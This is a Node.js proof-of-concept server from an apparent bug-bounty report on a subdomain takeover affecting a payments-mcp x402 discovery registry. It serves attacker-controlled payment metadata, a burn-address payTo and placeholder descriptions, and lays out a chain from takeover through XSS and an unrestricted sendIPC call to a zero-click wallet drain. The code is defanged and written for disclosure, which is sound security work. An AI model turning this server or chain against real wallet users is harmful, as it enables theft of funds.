const http = require('http');
const PORT = process.env.PORT || 8080;
const DOMAIN = process.env.RAILWAY_PUBLIC_DOMAIN || 'unknown';

http.createServer((req, res) => {
  // Log every request for evidence
  console.log(`[${new Date().toISOString()}] ${req.method} ${req.url} from ${req.headers['user-agent'] || 'unknown'}`);
  
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, X-Payment, Authorization');

  if (req.method === 'OPTIONS') {
    res.writeHead(204);
    res.end();
    return;
  }

  // Proof page at root
  if (req.url === '/' || req.url === '/index.html') {
    res.writeHead(200, {'Content-Type': 'text/html'});
    res.end(`<h1>Subdomain Takeover PoC - gh0stfqce</h1>
<p>Coinbase payments-mcp bug bounty</p>
<p>Domain: ${DOMAIN}</p>
<p>${new Date().toISOString()}</p>
<p>This domain is in the payments-mcp discovery registry and is served to all wallet installations.</p>`);
    return;
  }

  // x402 discovery — returns attacker-controlled metadata
  // This is what the wallet sees when it queries our endpoint
  if (req.url === '/.well-known/x402' || req.url === '/x402-discovery') {
    res.writeHead(200, {'Content-Type': 'application/json'});
    res.end(JSON.stringify({
      resources: [{
        resource: `https://${DOMAIN}/api/data`,
        description: "SECURITY_RESEARCH_POC — This description field is controlled by gh0stfqce via subdomain takeover. In a real attack, this would contain an XSS payload that executes via unsafe-inline CSP.",
        method: "GET",
        paymentRequirements: [{
          scheme: "exact",
          network: "base",
          maxAmountRequired: "100",
          asset: "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913",
          payTo: "0x000000000000000000000000000000000000dEaD",
          description: "SECURITY_RESEARCH_POC — Attacker controls payTo address"
        }]
      }]
    }));
    return;
  }

  // Proof JSON endpoint
  if (req.url === '/proof.json') {
    res.writeHead(200, {'Content-Type': 'application/json'});
    res.end(JSON.stringify({
      type: 'security_research',
      vulnerability: 'chained_subdomain_takeover_xss_wallet_drain',
      domain: DOMAIN,
      researcher: 'gh0stfqce',
      in_discovery_api: true,
      controlled_fields: ['description', 'resource', 'payTo', 'paymentRequirements'],
      chain: [
        '1. Subdomain takeover — domain in discovery registry',
        '2. Attacker controls x402 metadata (description, payTo)',
        '3. unsafe-inline CSP allows XSS via description field',
        '4. Unrestricted sendIPC in preload enables send-transaction',
        '5. Zero-click wallet drain on bazaar browse'
      ]
    }));
    return;
  }

  // Catch-all
  res.writeHead(200, {'Content-Type': 'application/json'});
  res.end(JSON.stringify({
    proof: 'subdomain_takeover',
    domain: DOMAIN,
    researcher: 'gh0stfqce',
    path: req.url,
    method: req.method,
    note: 'Attacker-controlled x402 endpoint in payments-mcp discovery registry'
  }));

}).listen(PORT, () => console.log(`[PoC] Running on port ${PORT} | Domain: ${DOMAIN}`));
